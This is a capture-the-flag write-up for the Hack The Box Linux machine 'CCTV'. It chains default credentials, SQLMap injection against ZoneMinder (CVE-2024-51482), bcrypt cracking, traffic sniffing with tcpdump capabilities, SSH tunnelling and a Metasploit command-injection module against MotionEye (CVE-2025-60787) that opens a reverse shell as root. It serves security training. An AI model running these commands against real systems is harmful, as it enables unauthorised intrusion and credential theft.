# CCTV: Hack The Box Writeup

**Machine:** CCTV  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

CCTV is an easy Linux machine running a ZoneMinder CCTV management platform exposed on port 80. Default credentials grant access to the web interface, which is vulnerable to a SQL injection flaw (CVE-2024-51482) in the `removetag` action. Exploiting this with SQLMap extracts bcrypt password hashes from the database; cracking them yields SSH access as `mark`. Post-exploitation enumeration with LinPEAS reveals `tcpdump` has `cap_net_raw` capabilities, allowing traffic capture on a Docker bridge network. Sniffing that interface exposes cleartext credentials for a second user, `sa_mark`, transmitted in a custom TCP protocol. As `sa_mark`, a locally bound MotionEye instance (port 8765) is discovered. Port forwarding exposes the service to the attack machine, and the sniffed credentials authenticate against it. MotionEye 0.43.1b4 is vulnerable to an authenticated command injection flaw (CVE-2025-60787), exploited via Metasploit to obtain a root shell.

**Key techniques:** Default credentials · SQL injection (CVE-2024-51482) · SQLMap with session cookie · bcrypt hash cracking · Linux capabilities abuse (`cap_net_raw`) · Network traffic sniffing on Docker bridge · Credential exposure in cleartext protocol · SSH port forwarding · MotionEye RCE (CVE-2025-60787)

---

## 1. Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.2.210
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
```

Two services: SSH and a web server. The HTTP service redirects to `cctv.htb`, so we add it to our hosts file:

```bash
sudo vi /etc/hosts
# Add: 10.129.2.210  cctv.htb
```

---

## 2. Enumeration

### Web Application: ZoneMinder

Navigating to `http://cctv.htb` presents a staff login page. Testing `admin:admin` grants immediate access: default credentials are in use.

The application is **ZoneMinder v1.37.63**, a widely deployed open-source CCTV management platform. This version is known to be vulnerable to SQL injection via CVE-2024-51482.

---

## 3. SQL Injection: CVE-2024-51482

### Understanding the Vulnerability

CVE-2024-51482 describes a SQL injection flaw in ZoneMinder's `removetag` action. The vulnerable parameter is `tid`, passed unsanitized in the following endpoint:

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

A public PoC exists, but testing showed it failed to enumerate any databases in this environment. Manual exploitation with SQLMap is more reliable.

### Generating a Session Cookie

SQLMap requires an authenticated session. We log in via `curl` and capture the resulting cookie to a file:

```bash
curl -s -c /tmp/zm_sql.jar -X POST "http://cctv.htb/zm/index.php" \
  -d "username=admin&password=admin&action=login&view=login" > /dev/null
```

The cookie file now contains a valid `ZMSESSID` value.

### Extracting Credentials with SQLMap

Running SQLMap against the vulnerable endpoint with the session cookie, targeting the `Users` table:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --batch -p "tid" --technique=T \
  --dump -D zm -T Users -C Username,Password \
  --cookie="ZMSESSID=1doqk16idkoreqn8io2tr1t1fm"
```

The `--technique=T` flag restricts SQLMap to time-based blind injection, which is what CVE-2024-51482 describes. Time-based blind injection is slow: extraction took several hours due to the progressive delay increases SQLMap applies when it encounters errors. The result:

```
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m  |
+------------+--------------------------------------------------------------+
```

---

## 4. Hash Cracking

The passwords are bcrypt hashes (`$2y$10$...`). Writing them to a file and cracking with John the Ripper:

```bash
cat > hashes.txt << 'EOF'
$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
EOF

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

John cracks one hash before the session is aborted:

```
opensesame   (mark)
```

Only `mark`'s password is recovered. The other two hashes remain uncracked.

---

## 5. Initial Access: SSH as `mark`

Testing the cracked credentials over SSH:

```bash
ssh mark@10.129.2.210
# Password: opensesame
# Login successful
```

---

## 6. Post-Exploitation Enumeration as `mark`

### Sudo

```bash
sudo -l
# No sudo privileges
```

### LinPEAS: Linux Capabilities

Running LinPEAS reveals a non-standard capability on `tcpdump`:

```
/usr/bin/tcpdump cap_net_raw=eip
```

**Linux capabilities** are a mechanism for granting specific elevated privileges to binaries without giving them full root. `cap_net_raw` allows a process to use raw sockets: which means capturing network traffic. The fact that `tcpdump` has this capability set on a non-root user is intentional: someone configured it deliberately. The implication is clear: we are expected to sniff traffic.

### Network Interfaces

Checking the network configuration:

```bash
ip a
```

Beyond the standard `eth0` and `docker0` interfaces, two Docker bridge networks are visible:

```
br-1b6b4b93c636  172.25.0.1/16
br-3e74116c4022  172.18.0.1/16
```

These bridge interfaces connect containers to the host. Any unencrypted traffic between containers on the same bridge will be visible to us.

---

## 7. Credential Harvesting: Traffic Sniffing

Capturing traffic on the first bridge interface:

```bash
tcpdump -i br-1b6b4b93c636 -nn -A
```

After a short wait, a TCP connection appears between `172.25.0.11` and `172.25.0.10` on port 5000. The payload is transmitted in cleartext:

```
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
```

A containerized service is sending credentials in plaintext as part of a custom command protocol. We now have credentials for a second user: `sa_mark:X1l9fx1ZjS7RZb`.

---

## 8. Lateral Movement: SSH as `sa_mark`

```bash
ssh sa_mark@10.129.2.210
# Password: X1l9fx1ZjS7RZb
# Login successful
```

```bash
cat user.txt
# acb4e1a06f772c683f3546df7ab9de5f
```

The home directory contains a PDF: `SecureVision Staff Announcement.pdf`. Transferring it to the attack machine for review:

```bash
# On Kali:
scp sa_mark@10.129.2.210:/home/sa_mark/'SecureVision Staff Announcement.pdf' ~/Downloads/HTB_Labs/cctv/
```

The document states that "Staff logins will remain the same": a direct hint at credential reuse across the infrastructure.

---

## 9. Privilege Escalation: MotionEye RCE (CVE-2025-60787)

### Discovering the Local Service

Checking locally bound ports:

```bash
netstat -tulnp
```

Port 8765 is listening on localhost with no obvious system service label. Probing it:

```bash
curl -sv http://127.0.0.1:8765/ 2>&1 | head -20
```

The response header identifies the service:

```
< Server: motionEye/0.43.1b4
```

**MotionEye** is a web frontend for the Motion CCTV software. Version 0.43.1b4 is vulnerable to **CVE-2025-60787**, an authenticated command injection flaw that allows RCE through a malicious camera configuration.

### Port Forwarding

Since the service is bound to localhost on the target, we forward it to our attack machine. From a new terminal on Kali:

```bash
ssh -L 9090:127.0.0.1:8765 sa_mark@10.129.244.156
```

This binds port 9090 on Kali and tunnels it to port 8765 on the target. Browsing to `http://127.0.0.1:9090` confirms the MotionEye login page is accessible.

> **Note:** The `-L` flag always binds on the machine where you run the SSH command. Running it from inside the target would attempt to bind on the target itself: where 8765 is already in use: causing an "Address already in use" error. Always run port forwarding commands from the Kali terminal.

### Exploitation

The sniffed credentials (`sa_mark:X1l9fx1ZjS7RZb`) authenticate against the MotionEye interface, consistent with the credential reuse hint in the PDF.

Metasploit includes a module for CVE-2025-60787:

```bash
msfconsole -q
use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
set RHOSTS 127.0.0.1
set RPORT 9090
set USERNAME admin
set PASSWORD X1l9fx1ZjS7RZb
set LHOST tun0
run
```

The module fingerprints the version, injects a malicious camera configuration, triggers the command injection, and delivers a Meterpreter session:

```
[+] The target appears to be vulnerable. Detected version 0.43.1b4, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Triggering exploit...
[*] Meterpreter session 1 opened (10.10.15.12:4444 -> 10.129.244.156:46546)
[+] Camera removed successfully
```

```bash
meterpreter > shell
whoami
# root
cat /root/root.txt
# 9a10c2a137aaba7f89417432272da66c
```

---

<img width="1194" height="678" alt="Screenshot 2026-04-21 210636" src="https://github.com/user-attachments/assets/4f82b41f-1903-4147-ad0b-dcdcbdb5f2a0" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Default credentials | ZoneMinder login (`admin:admin`) | Authenticated access to CCTV management platform |
| SQL injection: CVE-2024-51482 | `GET /zm/index.php?action=removetag&tid=` | Dump of all database users and bcrypt hashes |
| Weak bcrypt password | `mark`'s hash | SSH access via cracked password |
| `cap_net_raw` on tcpdump | `/usr/bin/tcpdump` | Full traffic capture on Docker bridge networks |
| Cleartext credentials in custom protocol | `br-1b6b4b93c636` bridge traffic | `sa_mark` credentials exposed in sniffed payload |
| Credential reuse | Sniffed creds → MotionEye login | Authenticated access to MotionEye |
| Command injection: CVE-2025-60787 | MotionEye 0.43.1b4 on port 8765 | RCE as root via malicious camera configuration |

---

## Key Takeaways

- **Default credentials are still everywhere**: `admin:admin` worked on both ZoneMinder and, implicitly, MotionEye. Always test defaults before attempting anything else
- **SQLMap needs authentication when the target does**: passing `--cookie` with a valid session is essential; without it, every request returns a 401 and SQLMap finds nothing
- **Time-based blind SQLi is slow by design**: the progressive delay increases SQLMap applies are a feature, not a bug; be patient and let it run
- **Linux capabilities are a frequently overlooked attack surface**: `cap_net_raw` on `tcpdump` is not a misconfiguration you'd spot without LinPEAS; always check capabilities
- **Sniff Docker bridge interfaces when you have `cap_net_raw`**: containers communicating on the same bridge do so in cleartext if the application doesn't encrypt; this is a realistic finding in real environments
- **Port forwarding direction matters**: `-L` always binds on the machine where you run the command; running it from inside the target binds on the target, not on Kali
- **Credential reuse across services is the norm, not the exception**: every set of credentials obtained should be tested against every available service

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
